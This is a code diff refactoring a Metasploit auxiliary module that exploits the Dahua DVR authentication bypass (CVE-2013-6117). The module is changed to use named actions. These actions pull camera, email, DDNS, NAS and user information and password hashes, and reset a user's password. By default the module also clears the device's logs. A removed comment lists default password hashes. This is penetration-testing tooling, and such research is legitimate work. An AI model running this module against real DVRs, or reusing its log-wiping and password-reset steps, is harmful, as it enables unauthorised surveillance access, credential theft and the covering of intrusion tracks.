@@ -15,22 +15,26 @@ class Metasploit3 < Msf::Auxiliary
         [ 'CVE', '2013-6117' ],
         [ 'URL', 'https://depthsecurity.com/blog/dahua-dvr-authentication-bypass-cve-2013-6117' ]
       ],
-      'License'         => MSF_LICENSE
-       )
+      'License'         => MSF_LICENSE,
+      'DefaultAction'  => 'VERSION',
+      'Actions'        =>
+        [
+          [ 'CHANNEL', { 'Description' => 'Obtain the channel/camera information from the DVR' } ],
+          [ 'DDNS', { 'Description' => 'Obtain the DDNS settings from the DVR' } ],
+          [ 'EMAIL', { 'Description' => 'Obtain the email settings from the DVR' } ],
+          [ 'GROUP', { 'Description' => 'Obtain the group information the DVR' } ],
+          [ 'NAS', { 'Description' => 'Obtain the NAS settings from the DVR' } ],
+          [ 'RESET', { 'Description' => 'Reset an existing user\'s password on the DVR' } ],
+          [ 'SERIAL', { 'Description' => 'Obtain the serial number from the DVR' } ],
+          [ 'USER', { 'Description' => 'Obtain the user information from the DVR' } ],
+          [ 'VERSION', { 'Description' => 'Obtain the version of the DVR' } ]
+        ]
+    )
 
     deregister_options('RHOST')
     register_options([
       OptString.new('USERNAME', [false, 'A username to reset', '888888']),
       OptString.new('PASSWORD', [false, 'A password to reset the user with, if not set a random pass will be generated.']),
-      OptBool.new('VERSION_INFO', [true, 'Grabs the version of DVR', false]),
-      OptBool.new('EMAIL_INFO', [true, 'Grabs the email settings of the DVR', false]),
-      OptBool.new('DDNS_INFO', [true, 'Grabs the DDNS settings of the DVR', false]),
-      OptBool.new('SN_INFO', [true, 'Grabs the SN of the DVR', false]),
-      OptBool.new('CHANNEL_INFO', [true, 'Grabs the cameras and their assigned name', false]),
-      OptBool.new('NAS_INFO', [true, 'Grabs the NAS settings of the DVR', false]),
-      OptBool.new('USER_INFO', [true, 'Grabs the Users and hashes of the DVR', true]),
-      OptBool.new('GROUP_INFO', [true, 'Grabs the Users and groups of the DVR', false]),
-      OptBool.new('RESET', [true, %q(Reset an existing user's pw?), false]),
       OptBool.new('CLEAR_LOGS', [true, %q(Clear the DVR logs when we're done?), true]),
       Opt::RPORT(37777)
     ])
@@ -86,7 +90,7 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def grab_sn
+  def grab_serial
     sock.put(SN)
     data = sock.get_once
     if data =~ /[\x00]{8,}([[:print:]]+)/
@@ -258,55 +262,38 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    # user8pwhash = "4WzwxXxM" #888888
-    # user6pwhash = "sh15yfFM" #666666
-    # useradminpwhash = "6QNMIQGe" #admin
-    connect
-    sock.put(U1)
-    data = sock.recv(8)
-    disconnect
-    if data == DVR_RESP
+    begin
+      connect
+      sock.put(U1)
+      data = sock.recv(8)
+      disconnect
+      return unless data == DVR_RESP
       print_good("#{peer} -- Dahua-based DVR found")
       report_service(host: rhost, port: rport, sname: 'dvr', info: "Dahua-based DVR")
 
-      if datastore['VERSION_INFO']
+      case action.name.upcase
+      when 'CHANNEL'
+        grab_channels
+      when 'DDNS'
+        grab_ddns
+      when 'EMAIL'
+        grab_email
+      when 'GROUP'
+        grab_groups
+      when 'NAS'
+        grab_nas
+      when 'RESET'
+        reset_user
+      when 'SERIAL'
+        grab_serial
+      when 'USER'
+        grab_users
+      when 'VERSION'
         grab_version
       end
-      # needs boolean logic to run or not run
-      if datastore['SN_INFO']
-        grab_sn
-      end
-      # needs boolean logic to run or not run
-      if datastore['EMAIL_INFO']
-        grab_email
-      end
-      # needs boolean logic to run or not run
-      if datastore['DDNS_INFO']
-        grab_ddns
-      end
-      # needs boolean logic to run or not run
-      if datastore['NAS_INFO']
-        grab_nas
-      end
-      # needs boolean logic to run or not run
-      if datastore['CHANNEL_INFO']
-        grab_channels
-      end
-      # needs boolean logic to run or not run
-      if datastore['USER_INFO']
-        grab_users
-      end
-      # needs boolean logic to run or not run
-      if datastore['GROUP_INFO']
-        grab_groups
-      end
-      if datastore['RESET']
-        reset_user
-      end
 
-      if datastore['CLEAR_LOGS']
-        clear_logs
-      end
+      clear_logs if datastore['CLEAR_LOGS']
+    ensure
       disconnect
     end
   end
